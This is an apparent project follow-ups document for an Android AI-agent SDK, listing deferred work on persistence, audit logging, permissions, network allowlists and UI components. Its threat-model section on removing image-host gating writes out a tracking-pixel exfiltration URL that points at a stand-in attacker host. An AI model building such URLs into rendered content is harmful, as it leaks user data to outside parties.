# Follow-ups

Tactical items the implementation flagged as deferred during build, with
enough context to pick them up later. Distinct from
[`13-v1.1-backlog.md`](13-v1.1-backlog.md), which captures *plan-level* v1
scope decisions; this doc captures *implementation-time* "ship the
simpler thing, come back to this" choices.

Each item: what, why deferred, scope estimate, code pointer.

---

## At-a-glance: what's left, by commitment level

This list is the orienting map. Detailed items live in the per-area sections
below; this is just the shape of the remaining work.

### Tactical — small features in a stable codebase

Each is its own turn or two of focused work. Ship as use cases demand them.

- **Persistence pass** — SQLDelight for TraceStore + conversation history +
  ScriptStorage + ScheduledNotificationStore (~3 turns as a bundle; see
  ["Persistence pass" bundle](#persistence-pass-bundle))
- **Audit log** — user-visible "what did Claude do to my device?" surface
  (~1.5 turns; see [Audit log](#audit-log))
- **Permission flow** — `ui_request_permission` stub + real prompts + extra
  `UserContext.snapshot()` fields (~1 turn; see
  ["Permission flow" bundle](#permission-flow-bundle))
- **Settings UI for network allowlist** — runtime host management instead
  of recompile (~1 turn; see [Network](#network))
- **Individual UI components** — `SearchBar`, `ButtonWithMenu` (dropdown),
  Charts (after lib choice), Tooltip, ExoPlayer-based Video — each ~½ to
  1 turn when a use case shows up

### Strategic — bigger commitments that change project direction

- **iOS validation** — build the protocol on SwiftUI; validates ADR-003.
  Multi-turn, needs iOS dev environment (see
  [iOS validation](#ios-validation-adr-003-still-proposed))
- **Second app on the SDK** — build app #2 to surface what the substrate
  silently assumes about Undercurrent. Probably the highest-leverage
  thing on the list. (~1–2 turns)
- **OSS prep** — license, README, contribution guide, demo gif, ADR
  cleanup. (~1 turn — pre-req: pick a license)

### Already in motion / deferred upstream

- **Prompt caching at wire level** — blocked on Koog adding Anthropic
  `cache_control` support; revisit when they ship it. See
  [Behavior — partially landed](#behavior--partially-landed).

---

## Harness

### Observability

- **SQLite/SQLDelight persistence for `TraceStore`.** Currently
  [`InMemoryTraceStore`](../harness/observability/src/main/kotlin/dev/mas/harness/observability/TraceStore.kt)
  keeps the last 100 traces; lost on app restart. Plan calls for SQLDelight
  with size-cap + encrypted-at-rest ([07-harness.md:105](07-harness.md)).
  Scope: ~1 turn (add SQLDelight to module, schema, port store).
- **Feedback collection (👍/👎 per turn).** Plan says it lives in this
  module. Trace data class would need a `feedback: TraceFeedback?` field;
  TraceViewer needs the buttons. Scope: ~30 min.
- **JSON export.** Single button on a trace → share JSON via `external_share`.
  Scope: ~15 min.
- **Privacy options** — redact params by regex, opt-in telemetry. Plan
  ([07-harness.md:106](07-harness.md)) mentions this; not started.
  Scope: ~1 turn.
- **Trace store size-cap by bytes** (not just count). Scope: small once
  SQLDelight lands.

### Reliability — partially landed

**Landed in v1:**
- [`RetryPolicy`](../harness/reliability/src/main/kotlin/dev/mas/harness/reliability/RetryPolicy.kt)
  with exponential backoff (3 attempts, 1s base / 30s max, 25% jitter)
  on transient failures.
- [`CircuitBreaker`](../harness/reliability/src/main/kotlin/dev/mas/harness/reliability/CircuitBreaker.kt)
  with 3-consecutive-fail → OPEN (60s) → HALF_OPEN states.
- [`withRetry()`](../harness/reliability/src/main/kotlin/dev/mas/harness/reliability/Retry.kt)
  wraps `agent.run()` in `SubstrateAgent.send()`. Emits `ToolEvent.Failed`
  with `toolName="llm.retry"` so the chat surfaces retries inline.

**Deferred:**
- **Fallback model selection** — on persistent failure of primary, try a
  cheaper/secondary model. Needs a routing decision and per-model cost
  awareness; out of scope for v1.
- **Degraded-mode UI signal** — when CircuitBreaker is OPEN, the app
  should show a banner ("Claude is unreachable — retry in 47s"). Currently
  it just throws on send.

Scope to finish: ~½ turn (expose CircuitBreaker state on SubstrateAgent;
render banner in ChatScreen).

### Behavior — partially landed

**Compaction is live.** SubstrateAgent uses
[Compactor](../harness/behavior/src/main/kotlin/dev/mas/harness/behavior/Compactor.kt)
with `SlidingWindow(keepLastN = 20)` by default; device snapshot moved out
of the system prompt into the user message (prerequisite for caching).

**Prompt caching is NOT live.** Koog 0.8.0's `CacheControl` sealed interface
only ships Bedrock variants — no `CacheControl.Anthropic` subtype, no path
from `cacheControl` on `PromptBuilder.system(…)` to Anthropic's
`cache_control` wire field. Two ways to unblock:

1. **Wait for upstream** — Koog gains Anthropic cache support in a future
   release. Then flip `BehaviorConfig.cacheEnabled = true` and pass
   `cacheControl = AnthropicCacheControl.FiveMinutes` to the system / last
   history message in `SubstrateAgent.buildAgentForThisTurn`. Probably hours.
2. **Fork or extend** — implement an Anthropic CacheControl variant and
   patch the Anthropic wire serializer. Multi-day.

Estimated cost loss without it: roughly 7× input billing on long
conversations. Real but not immediately blocking — file a Koog issue when
ready.

### Cost — landed

- [`UsageStore`](../harness/cost/src/main/kotlin/dev/mas/harness/cost/UsageStore.kt)
  aggregates lifetime + per-day USD + token totals. Updated from Koog's
  `onLLMCallCompleted` event in `SubstrateAgent`.
- [`PriceTable`](../harness/cost/src/main/kotlin/dev/mas/harness/cost/PriceTable.kt)
  carries per-model Anthropic prices (Sonnet 4.6 = $3/$15 per MTok in/out).
- [`QuotaPolicy`](../harness/cost/src/main/kotlin/dev/mas/harness/cost/UsageStore.kt)
  $5 soft warning / $10 hard cap per day. `SubstrateAgent.send` throws
  `QuotaExceededException` over the cap.
- Per-day cost badge in `ChatScreen` top bar.

**Deferred:**
- Monthly aggregation — `UsageTotals` keeps `byDay`; a `byMonth` view is a
  ~5-line StateFlow derivation when needed.
- Configurable quotas via settings UI — currently hardcoded to $5/$10.
- Cost persistence (lives in SQLDelight pass).

### Memory — partially landed

**Landed in v1:**
- [`MemoryStore`](../harness/memory/src/main/kotlin/dev/mas/harness/memory/MemoryStore.kt)
  interface + `InMemoryMemoryStore` (substring search, scope filter, tag filter).
- [`MemoryStoreTool`](../harness/memory/src/main/kotlin/dev/mas/harness/memory/MemoryTools.kt)
  and `MemoryRecallTool` — `SubstrateTool` subclasses registered in
  `SubstrateRuntime`.
- [`PiiDetector`](../harness/memory/src/main/kotlin/dev/mas/harness/memory/PiiDetector.kt)
  with conservative regex patterns for SSN/CC/phone/email; surfaces a
  confirmation prompt via `ui.askUser` before persisting.
- [`AgentMemoriesScreen`](../apps/undercurrent/android/src/main/kotlin/dev/mas/undercurrent/ui/AgentMemoriesScreen.kt)
  on Android; lists every entry, per-row delete, clear-all confirmation.
- System prompt advertises memory tools + storage policy.

**Deferred:**
- SQLDelight + FTS5 — part of the persistence-pass bundle.
- Provenance wrapping on recall (the response currently returns content
  verbatim; future v1.1 should wrap each hit with `(stored on <date>: …)`
  so the LLM signals to the user *when* something was remembered).
- iOS viewer.

Scope to land deferred pieces: ~½ turn for provenance wrapping; FTS5
falls out of the persistence bundle "for free."

### Quality — verified free under Koog

Probed `agents-core` 0.8.0
[`GenericAgentEnvironment.executeToolCall`](https://github.com/JetBrains/koog).
Three failure paths, all wrapped into structured `ReceivedToolResult`s the
agent loop hands back to the LLM:

- **Arg-parse failure** (`tool.decodeArgs` throws) → `content = "Tool
  with name '<name>' failed to parse arguments due to the error: <msg>"`,
  `resultKind = ToolResultKind.Failure`. No crash; the LLM corrects on the
  next turn.
- **`ToolException` thrown from `execute`** → returned as
  `ToolResultKind.ValidationError` with the message; loop recovers.
- **Any other `Exception` from `execute`** → wrapped as
  `ToolResultKind.Failure`; loop recovers.

No retry-with-feedback layer needed. If we later want richer error shapes
(e.g., a `"hint"` field the LLM gets to disambiguate), override
`SubstrateTool.decodeArgs` to throw `ToolException.ValidationFailure` with
a curated message.

---

## Tools

### `ui_request_permission` is a stub

Current implementation in
[`UiTools.kt`](../scripts/core/src/main/kotlin/dev/mas/scripts/core/tools/UiTools.kt)
calls `os.permissions.request()` which doesn't actually launch the
system prompt — it just re-checks state. A real implementation needs an
Activity-hosted `ActivityResultLauncher` plus a way for the substrate
to drive the UI through it.

Two designs possible:
1. `UiBridge.requestPermission(...)` suspends until the host runs the
   launcher and returns the result.
2. The Activity registers a `PermissionPromptHost` with `OsCapabilities`
   at construction.

Scope: ~½ turn once design is picked.

### `external_share` file-URI sharing

[`AndroidSharing.kt`](../os-bridge/src/main/kotlin/dev/mas/osbridge/sharing/AndroidSharing.kt)
currently shares text + URL only. File-URI sharing needs the FileProvider
infrastructure (which we have for `files_share`) and a small unified path.

Scope: ~15 min.

### UI tool consolidation (architectural)

User raised: `ui_ask`, `ui_dialog`, `ui_navigate`, `ui_request_permission`
will scale to 10+ UI tools if Phase 4 templates ship as separate tools.
Option B from that discussion: one `ui` tool with sealed `UiOperation`.

Risk: Koog 0.8.x sealed-class schema gen for polymorphic Args may
produce awkward JSON Schema (`oneOf`) that confuses Claude. Needs a
small probe before committing.

Scope: ~1 turn including probe and verification.

### Tool vs. "substrate primitive" distinction

User raised: tools like `system_user_context`, `ui_dialog` aren't really
"tools" — they're substrate primitives. Could become a separate
abstraction post-v1 to clarify mental model. Tracking for v1.1 design
discussion.

---

## Network

### Settings UI for the allowlist

[`SubstrateRuntime.networkPolicy`](../apps/undercurrent/android/src/main/kotlin/dev/mas/undercurrent/SubstrateRuntime.kt)
hardcodes a 3-host demo allowlist. Users can't add/remove domains
without rebuilding the app. Plan ([08-security-and-compliance.md:46](08-security-and-compliance.md))
calls for a settings screen with confirmation modal + audit-log entry
on each addition.

Scope: ~1 turn (Compose screen, persist list, hook into NetworkPolicy).

### Per-host consent (paranoia mode)

[08-security-and-compliance.md:150](08-security-and-compliance.md)
mentions an opt-in "confirm each unique destination" mode. Not started.
v1.1 territory.

---

## Audit log

Plan ([08-security-and-compliance.md:116](08-security-and-compliance.md))
specifies: every script invocation, LLM call, permission grant/deny,
network destination, memory store/recall logged with non-blocking
writes.

Current state: nothing wired. The Observability work landed traces
(developer-facing); audit log is the security-facing user-visible "what
did Claude do?" view, distinct but similar in shape.

Scope: ~1.5 turns. Probably builds on top of TraceStore — extracted
audit entries written to a separate `AuditStore` (SQLDelight, append-only).

---

## Persistence

### Conversation history across app restarts

`SubstrateAgent.history` is in-memory. Restart = empty chat. Not in
the Phase 3 scope per plan, but flagged because users will notice.

Scope: ~½ turn — persist `history` into the same store that backs
TraceStore (or its own SQLDelight table).

### Per-tool storage (`ScriptStorage`) backed by SQLDelight

[`InMemoryScriptStorage`](../apps/undercurrent/android/src/main/kotlin/dev/mas/undercurrent/SubstrateRuntime.kt)
loses idempotency keys + polling cursors on restart. Tools that rely on
idempotency become unreliable across restarts. Currently no tool does
in practice; needs to be real before, say, real `data.upsert` against a
network-backed source.

Scope: ~½ turn after SQLDelight is in.

### `ScheduledNotificationStore` (already noted in `AndroidOsCapabilities`)

`AndroidOsCapabilities.create` uses `InMemoryStringKeyStore` for the
notification schedule. Comment marks it `TODO(phase-3)`. Schedules
survive only while the app process is alive.

Scope: ~15 min — swap in a `SharedPreferences`-backed `StringKeyStore`.

---

## UI / Phase 4 — landed

Per [ADR-007](adr/ADR-007-component-tree-ui-protocol.md), Phase 4 shipped
the LLM-composed component-tree UI protocol. What landed:

- **Wire format**:
  [`ComponentNode`](../contracts/src/main/kotlin/dev/mas/contracts/ComponentNode.kt)
  + `UIUpdate.RenderTree` (with `MAX_DEPTH = 6`).
- **Component registry + 20 default components** in
  [`:substrate:android/.../ui/components/`](../substrate/android/src/main/kotlin/dev/mas/substrate/android/ui/components):
  Tier-1 layout/display (8), Tier-2 stateful primitives (8), and macros
  ([Timer / Stopwatch / Form / Picker](ui-components.md#macros--bundled-behavior-widgets)).
- **`ui_render` tool** that validates trees pre-render (rejects unknown
  components and over-depth with structured errors the LLM can recover from).
- **Default surface is full-screen** via
  [`AgentRenderedTreeScreen`](../substrate/android/src/main/kotlin/dev/mas/substrate/android/ui/components/AgentRenderedTreeScreen.kt);
  [`AgentRenderedTreePanel`](../substrate/android/src/main/kotlin/dev/mas/substrate/android/ui/components/AgentRenderedTreePanel.kt)
  retained as an inline alternative.
- **Event round-trip**: `ComponentEvent.Action` → `SubstrateAgent.sendEvent`
  → synthetic user message → next agent turn. Form/Timer/etc. only fire
  semantic events; local interaction (typing, pause, +5m) stays local.
- **App extensibility**: `SubstrateRuntime.create(..., extraComponents = …)`.
- **Docs**: [ui-components.md](ui-components.md),
  [writing-a-custom-component.md](writing-a-custom-component.md).

### Image host allowlist — intentionally removed

Briefly added (host-gating on `Image` via the substrate's `ImageLoader`)
and then removed because the friction outweighed the actual threat. Image
loading is read-only "asset fetch" — every browser does it freely. The
`network_fetch` allowlist still applies to all agent-initiated HTTP
(higher damage radius: methods, bodies, readable responses).

Threats accepted by allowing arbitrary image hosts:
- **Tracking pixels** — `Image(url="https://attacker.example/leak?data=…")`
  would beacon a tiny payload. Narrow channel; LLM would have to construct
  this URL specifically.
- **Resource cost** — a tree with N image URLs fires N background
  fetches. The pre-render depth + node-count limits cap this.

If a future deployment needs strict gating (B2B SaaS, regulated data),
the substrate's `ImageLoader` is the natural injection point — drop in an
OkHttp interceptor that filters against an allowlist, same pattern we
prototyped and reverted.

### Deferred from Phase 4

- **`IntentRouter` default impl** — interface lives in `:design-system:api`
  from Phase 1 but is now largely redundant since the LLM picks components
  directly. Keep the interface; defer a default impl until a use case
  surfaces (e.g., apps wanting to transform / annotate trees before render).
- **`UIUpdate.Navigate(ScreenSpec)` cleanup** — the `template` + `props`
  pathway predates the component-tree model. Still supported (the type
  is in contracts) but unused. Decide v1.1: deprecate or wire to a
  template-factory layer.
- **System-prompt token budget** — the auto-assembled component catalog +
  examples is now ~2KB. Worth measuring impact on long conversations
  once Anthropic cache_control lands via Koog.
- **Component preview gallery** — a debug screen rendering one example
  tree per component, helpful for app authors. ~½ turn.
- **Trace-viewer thumbnails for `ui_render`** — show a "rendered N
  nodes" preview in the trace detail. ~½ turn.

### Macro candidates for v1.1

Each kills another category of round-trips. Ship as use cases surface.

- `Wizard` — multi-step Next/Back with internal step state. Emits
  `wizard_completed` with all step values bundled.
- `Counter` — +/− buttons + display. Emits `counter_finalized(value)`.
- `Map` — geocoded location pin. Needs Maps SDK; emits taps.
- `Chart` — line/bar/donut data viz. Stateless; takes a data series.
- `MediaPlayer` — play/pause/scrub for audio or video.

---

## Substrate extensibility — landed

[`SubstrateRuntime`](../apps/undercurrent/android/src/main/kotlin/dev/mas/undercurrent/SubstrateRuntime.kt)
now takes two app-supplied hooks:

- `extraContextProviders: List<ContextProvider>` — merged with the default
  `device` provider when building the `ContextRegistry`.
- `extraToolsFactory: (SubstrateContext) -> List<SubstrateTool<*, *>>` —
  called with the substrate context; returned tools are appended to the
  catalog *after* the substrate's stable prelude (keeps prompt-caching
  prefix stable once Koog ships cache_control).

`create(context, uiBridge, extraContextProviders, extraToolsFactory)`
honors both.

---

## Platform

### iOS validation (ADR-003 still "Proposed")

The Compose+SwiftUI strategy was never validated with a real iOS app
build. Plan calls for it as Phase 0 Day 4 work that we skipped per the
"Android-only" choice at session start.

Scope: 1+ turn once we have an iOS dev environment ready.

### `AndroidPermissions.request()` doesn't prompt

Tied to the `ui_request_permission` stub above. Same fix.

### `UserContext.snapshot()` — LOCATION / BATTERY / NETWORK fields

`MinimalUserContext` only fills time/timezone/locale. LOCATION needs
runtime permission + LocationManager; BATTERY needs BatteryManager;
NETWORK needs ConnectivityManager.

Scope: ~½ turn for all three (the boilerplate is small; permission
flows are the real work).

---

## Documentation

### Per-script doc files under `docs/scripts/`

[05-script-catalog.md:250](05-script-catalog.md) calls for a doc per
tool following its template. We have zero. The tool descriptions in
each `SubstrateTool` are pretty thorough so the doc cost is low if
generated from those.

Scope: ~½ turn (could be partly auto-generated).

### Module contract docs (`docs/modules/<name>.md`)

[03-modules.md:303](03-modules.md) has the template. We have zero
filled in.

Scope: ~½ turn for the substrate modules we actually build (others can
stay stubbed).

---

## Build / tooling

### Lint-vital disabled across the repo

[build.gradle.kts](../build.gradle.kts) globally disables
`lintVitalRelease` because of AGP 8.7.3 / JDK 25 incompatibility. Re-enable
when AGP catches up or we switch to JDK 17 for the daemon.

### CI workflow exists but never run

[.github/workflows/ci.yml](../.github/workflows/ci.yml) — no GitHub remote
yet, so it's untested.

### Detekt config is intentionally lax

[config/detekt/detekt.yml](../config/detekt/detekt.yml) starts loose
during Phase 0. Tighten as the codebase grows.

---

## Bundles (work that shares a prerequisite)

Several deferred items would land more cheaply if grouped, because they share an
infrastructure dependency. Tracked here so future-you sees the bundle before
picking off the first item.

### "Persistence pass" bundle

These four items all become trivial once SQLDelight is added to the relevant
modules. Doing them together amortizes the SQLDelight setup.

- **SQLite persistence for `TraceStore`** ([Harness > Observability](#observability))
- **Conversation history across app restarts** ([Persistence](#persistence))
- **`ScheduledNotificationStore` in-memory** ([Persistence](#persistence))
- **Per-tool `ScriptStorage` backed by SQLDelight** ([Persistence](#persistence))

Combined scope: ~1 turn for SQLDelight setup + ~½ turn per store = roughly 3 turns.
Cheaper than doing them separately because the schema design + driver wiring is
done once.

When picking this up: design the per-app SQLDelight database first (one DB,
multiple tables — `traces`, `conversation_messages`, `scheduled_notifications`,
`script_storage`), then port each store.

### "User-visible accountability" bundle

These two stores back the user-facing "what is Claude doing on my device?" view.
They're separate concerns but the UI surface is shared.

- **Audit log** (security-facing — every action with redacted params)
- **`TraceStore` viewer enhancements** — feedback collection (👍/👎),
  JSON export, privacy redaction

Doing them together gives us a single settings screen with two tabs ("Traces"
for developers, "What Claude did" for users) instead of two separate flows.

Combined scope: ~2 turns.

### "Permission flow" bundle

`ui_request_permission` is a stub; `AndroidPermissions.request()` doesn't prompt;
several capabilities (LOCATION, etc.) need richer runtime-permission handling.

- **`ui_request_permission` stub** ([Tools](#tools))
- **`AndroidPermissions.request()`** ([Platform](#platform))
- **`UserContext.snapshot()` location/battery/network** ([Platform](#platform))

One unified Activity-hosted permission-prompt flow (probably via a new
`UiBridge.requestPermission` method that triggers an `ActivityResultLauncher`)
fixes all three at once.

Combined scope: ~1 turn.

---

## How to use this doc

- Anything that says "this turn" or "previous turn" was deferred during
  active implementation — not a plan-level decision, so it doesn't belong
  in `13-v1.1-backlog.md`.
- Anything here should be doable in the scope estimate without
  re-architecting. Bigger items get their own ADR.
- When picking one up: search the codebase for the linked file, check
  whether anything has shifted since this entry, then re-scope.
- When *adding* an item: include enough context (file path, design
  alternatives considered, scope estimate) that future-you can act on it
  cold.
